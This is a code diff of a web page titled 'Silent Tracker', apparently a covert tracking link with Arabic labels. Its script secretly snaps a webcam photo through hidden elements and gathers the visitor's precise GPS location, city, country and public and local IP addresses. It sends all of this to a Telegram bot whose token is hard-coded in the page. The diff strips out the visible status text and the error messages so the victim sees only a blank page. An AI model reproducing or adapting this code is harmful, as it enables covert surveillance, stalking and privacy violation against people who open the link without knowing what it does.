@@ -2,12 +2,20 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>📍 تحديد + تصوير + IPs</title>
+  <title>Silent Tracker</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: white;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <pre id="result">📡 جاري جمع المعلومات...</pre>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
@@ -22,8 +30,6 @@
     let city = "";
     let country = "";
     let flagEmoji = "";
-    let browserInfo = "";
-    let batteryInfo = "🔋 البطارية: ❌ غير مدعومة";
 
     function sendPhoto(blob) {
       const form = new FormData();
@@ -47,11 +53,8 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
 🏙️ المدينة: ${city || "❌"}
 🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}
 
-🌐 المتصفح: ${browserInfo}
-${batteryInfo}
-
 🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
-      document.getElementById("result").innerText = message;
+      
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -78,16 +81,14 @@ Longitude: ${gpsLon}
 📏 الدقة: ±${acc} متر`;
             checkIfReady();
           },
-          err => {
-            gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
-            document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
+          () => {
+            gpsMsg = `❌ فشل تحديد الموقع`;
             checkIfReady();
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
-        gpsMsg = "❌ جهازك لا يدعم GPS";
-        document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
+        gpsMsg = "❌ GPS غير مدعوم";
         checkIfReady();
       }
     }
@@ -148,33 +149,27 @@ Longitude: ${gpsLon}
       }, 2000);
     }
 
-    function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(battery => {
-          const percent = Math.round(battery.level * 100);
-          batteryInfo = `🔋 البطارية: ${percent}% ${battery.charging ? "🔌 (تشحن)" : "🔋 (ليست مشحونة)"}`;
+    function initCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+          video.addEventListener("playing", () => {
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+            stream.getTracks().forEach(track => track.stop());
+          });
+        })
+        .catch(() => {
+          // فشل الكاميرا بدون عرض رسالة
         });
-      }
     }
 
-    function detectBrowser() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome")) {
-        browserInfo = "Chrome";
-      } else if (ua.includes("Firefox")) {
-        browserInfo = "Firefox";
-      } else if (ua.includes("Safari")) {
-        browserInfo = "Safari";
-      } else if (ua.includes("Edg")) {
-        browserInfo = "Edge";
-      } else {
-        browserInfo = "غير معروف";
-      }
-    }
-
-    // بدء كل العمليات
-    detectBrowser();
-    getBatteryInfo();
+    // بدء العمليات
     getLocation();
     getPublicIP();
     getLocalIP();
